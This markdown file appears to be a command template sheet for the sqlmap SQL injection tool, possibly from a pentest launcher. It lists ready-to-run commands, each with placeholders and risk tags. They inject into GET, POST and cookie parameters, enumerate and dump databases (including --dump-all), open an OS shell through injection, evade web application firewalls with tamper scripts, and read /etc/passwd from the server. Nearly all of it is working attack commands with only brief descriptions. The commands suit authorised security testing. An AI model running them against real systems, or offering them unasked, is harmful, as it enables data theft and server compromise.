# sqlmap

> Automatic SQL injection detection and exploitation tool

<!-- tags: sqli, injection, database, exploitation, web -->

---

## inject sqli GET param
Test a URL GET parameter for SQL injection.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --batch --random-agent -o {{OUTFILE:file:sqlmap-output}}
```

<!-- meta: risk=med | phase=vuln | tags=get,sqli -->

---

## inject sqli POST param
Test POST parameters for SQL injection.

```bash
sqlmap -u "{{URL:url:http://target.com/login.php}}" --data="{{POSTDATA:str:username=admin&password=test}}" --batch --random-agent
```

<!-- meta: risk=med | phase=vuln | tags=post,sqli -->

---

## inject sqli burp request file
Use a saved Burp request file as input for sqlmap.

```bash
sqlmap -r {{REQUEST_FILE:file:request.txt}} --batch --random-agent
```

<!-- meta: risk=med | phase=vuln | tags=burp,request -->

---

## inject sqli cookie param
Test injection in cookie parameters.

```bash
sqlmap -u "{{URL:url:http://target.com/dashboard.php}}" --cookie="{{COOKIE:str:session=abc123; role=user}}" --level 2 --batch --random-agent
```

<!-- meta: risk=med | phase=vuln | tags=cookie,sqli -->

---

## enum databases sqli
List all databases on the backend DBMS.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --dbs --batch --random-agent
```

<!-- meta: risk=med | phase=enum | tags=databases,enumeration -->

---

## dump table data sqli
Dump a specific table from a database.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" -D {{DATABASE:str:targetdb}} -T {{TABLE:str:users}} --dump --batch --random-agent
```

<!-- meta: risk=med | phase=enum | tags=dump,tables -->

---

## sqli os shell rce
Attempt to gain an OS shell through SQL injection.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --os-shell --batch --random-agent
```

<!-- meta: risk=high | phase=exploit | tags=shell,rce -->

---

## bypass WAF tamper scripts sqli
Use tamper scripts to bypass WAF or input filters.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --tamper={{TAMPER:str:space2comment,between}} --batch --random-agent
```

<!-- meta: risk=med | phase=vuln | tags=tamper,waf-bypass -->

---

## scan sqli high level risk
Run sqlmap with maximum detection level and risk settings.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --level={{LEVEL:int:5}} --risk={{RISK:int:3}} --batch --random-agent --threads={{THREADS:int:5}}
```

<!-- meta: risk=high | phase=vuln | tags=aggressive,thorough -->

---

## dump all sqli full auto
Fully automated scan: detect, enumerate, and dump everything.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --batch --random-agent --dbs --dump-all --exclude-sysdbs -o {{OUTFILE:file:sqlmap-full}}
```

<!-- meta: risk=high | phase=exploit | tags=auto,full-dump -->

---

## inject second order sqli
Use a second request file for stored-and-executed (second-order) injections.

```bash
sqlmap -r {{REQ:file:request.txt}} -p {{PARAM:str:genres}} --second-req {{SECOND:file:second.txt}} --tamper=space2comment --level 5 --risk 3 --batch --dbs
```

<!-- meta: risk=med | phase=vuln | tags=second-order,multi-step -->

---

## route sqli burp proxy
Route sqlmap traffic through a local Burp proxy for inspection.

```bash
sqlmap -r {{REQ:file:request.txt}} --proxy http://127.0.0.1:8080 --tamper=space2comment --level 5 --risk 3 --batch --dbs
```

<!-- meta: risk=med | phase=vuln | tags=proxy,burp -->

---

## inject sqli url list bulk
Test multiple URLs from a file in one run.

```bash
sqlmap -m {{URL_LIST:file:urls.txt}} --tamper=space2comment --level 5 --risk 3 --batch --dbs --technique=BEUSTQ
```

<!-- meta: risk=med | phase=vuln | tags=batch,urls,bulk -->

---

## sqli read file filesystem
Read a file from the database server filesystem (when DBMS user has FILE priv).

```bash
sqlmap -r {{REQ:file:request.txt}} --batch --file-read={{REMOTE_FILE:str:/etc/passwd}}
```

<!-- meta: risk=high | phase=exploit | tags=file-read,filesystem -->

---

## limit sqli techniques
Restrict sqlmap to specific injection techniques (B,E,U,S,T,Q).

```bash
sqlmap -u "{{URL:url}}" --technique={{TECH:str:BEUSQ}} --batch --random-agent
```

<!-- meta: risk=med | phase=vuln | tags=technique,filter -->
